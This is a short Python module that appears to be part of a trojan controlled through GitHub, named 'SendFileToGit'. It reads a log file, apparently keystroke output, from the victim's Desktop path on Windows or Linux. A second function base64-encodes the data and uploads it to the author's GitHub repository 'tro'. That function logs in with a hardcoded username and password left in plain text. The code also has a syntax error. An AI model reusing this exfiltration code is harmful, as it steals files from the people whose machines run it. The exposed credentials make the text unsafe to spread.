from github3 import login
import json
import base64
import os

path = "others/"
filePath = "Tapalog.log"#base64.b64encode("Tapalog.log")
TargetWinFilePath = "C:\\Users\\this-PC\\Desktop\\work\\Tapalog.log"
TargetLinuxFilePath = "$HOME/Desktop/user"

def getOSPath():
	if os.name == 'posix':
		return TargetLinuxFilePath
	elif os.name == 'nt':
		return TargetWinFilePath
	else 
		return str("OS not recognized!")

def run(**args):
	print("[*] In SendFileToGit module.") #Todelete
	try:
		TargetOSfilePath = getOSPath()
		fich = open(TargetOSfilePath, "r")
		content = fich.read()
		fich.close()
		#store_module_result(content)
		return str(content)
	except:
		return "SendFileToGit: File %s not found"% TargetOSfilePath



def connect_to_github():
	gh = login(username="MarvenGarsalli",password="1'mfor1am")
	repo = gh.repository("MarvenGarsalli","tro")
	branch = repo.branch("master")
	return gh,repo,branch

def store_module_result(data):
	gh,repo,branch = connect_to_github()
	remote_path= path+"sendFileToGit/"+filePath
	repo.create_file(remote_path,"Upload file %s"%filePath, base64.b64encode(data))
	return
